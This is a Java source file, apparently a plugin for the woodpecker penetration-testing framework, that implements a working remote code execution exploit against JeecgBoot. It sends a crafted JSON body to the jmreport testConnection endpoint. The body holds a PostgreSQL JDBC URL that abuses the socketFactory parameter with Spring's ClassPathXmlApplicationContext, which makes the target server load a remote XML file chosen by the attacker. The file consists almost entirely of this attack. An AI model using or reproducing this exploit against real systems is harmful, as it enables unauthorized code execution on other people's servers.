package plugins.vul.jeecgboot;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.tools.misc.RandomUtil;
import plugins.vul.spring.cloud.gateway.CVE_2022_22947_Plugin;

import java.util.Arrays;
import java.util.HashMap;
import java.util.Map;

public class Jeecgboot_JDBC_RCE_Exploit implements IExploit {
    private IPluginHelper helper;
    public Jeecgboot_JDBC_RCE_Exploit() {
        helper = CVE_2022_22947_Plugin.pluginHelper;
    }
    private static String body_template = "{\n" +
            "  \"id\": \"\",\n" +
            "  \"code\": \"\",\n" +
            "  \"dbType\": \"\",\n" +
            "  \"dbDriver\": \"%s\",\n" +
            "  \"dbUrl\": \"jdbc:%s://127.0.0.1:5432/%s?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=%s\",\n" +
            "  \"dbName\": \"\",\n" +
            "  \"dbUsername\": \"\",\n" +
            "  \"dbPassword\": \"\",\n" +
            "  \"connectTimes\": 5\n" +
            "}";

    @Override
    public String getExploitTabCaption() {
        return "加载远程类";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();

        // 数据库类型
        IArg databaseType = helper.createArg();
        databaseType.setName("database-type");
        databaseType.setRequired(true);
        databaseType.setDefaultValue("postgresql");
        databaseType.setEnumValue(Arrays.asList("postgresql","mysql","h2"));
        databaseType.setDescription("数据库类型");

        // 数据库类型
        IArg xmlUrl = helper.createArg();
        xmlUrl.setName("xml-url");
        xmlUrl.setRequired(true);
        xmlUrl.setDefaultValue("http://127.0.0.1/exp.xml");
        xmlUrl.setDescription("xml url地址");

        usageBinder.setArgsList(Arrays.asList(databaseType,xmlUrl));
        return usageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String url = iTarget.getAddress();
        String databaseType = (String) map.get("database-type");
        String xmlUrl = (String) map.get("xml-url");
        String driver = null;
        switch (databaseType){
            case "postgresql":
                driver = "org.postgresql.Driver";
            case "mysql":
            case "h2":
                break;
        }
        if (driver == null){
            iResultOutput.infoPrintln("该驱动利用暂未实现");
            return;
        }
        String body = String.format(body_template, driver,databaseType, RandomUtil.getRandomString(4),xmlUrl);

        HashMap headers = new HashMap();
        headers.put("Content-Type","application/json");
        RawResponse response = Requests.post(url + "/jeecg-boot/jmreport/testConnection")
                .headers(headers)
                .body(body)
                .send();
        String result = response.readToText();
        if (result.contains("ClassPathXmlApplicationContext could not be instantiated")){
            iResultOutput.infoPrintln("数据包发送成功");
        } else {
            iResultOutput.failPrintln("利用失败");
        }
    }
}
